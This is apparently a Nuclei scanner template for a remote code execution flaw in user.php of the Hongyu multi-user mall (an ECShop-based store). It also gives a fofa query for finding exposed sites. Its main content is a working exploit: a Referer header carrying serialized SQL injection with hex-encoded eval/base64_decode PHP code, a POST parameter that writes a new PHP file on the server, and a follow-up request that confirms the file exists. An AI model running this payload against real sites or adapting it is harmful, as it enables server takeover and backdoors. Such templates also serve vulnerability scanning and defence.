id: hongyuduo-user-rce

info:
  name: hongyuduo-user-rce
  author: linfeng7z
  severity: critical
  description: 鸿宇多用户商城 user.php 存在任意命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
  metadata:
    fofa-qeury: body="content=HongYuJD" && body="68ecshopcom_360buy"
    veified: true
  tags: hongyuduo,rce
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"
  risk: "file_put_contents('{{file_name}}.php','<?php phpinfo();?>');"

http:
  - raw:
      - |
        POST /user.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:233:"*/SELECT 1,0x2d312720554e494f4e2f2a,3,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243686959584e6c4e6a52665a47566a6232526c4b435266554539545646747961574e7258536b704f773d3d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 34

        action=login&rick={{base64(risk)}}
      - |
        GET /{{file_name}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0   

    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains(body_2,'PHP Version') && contains(header_2,'text/html')"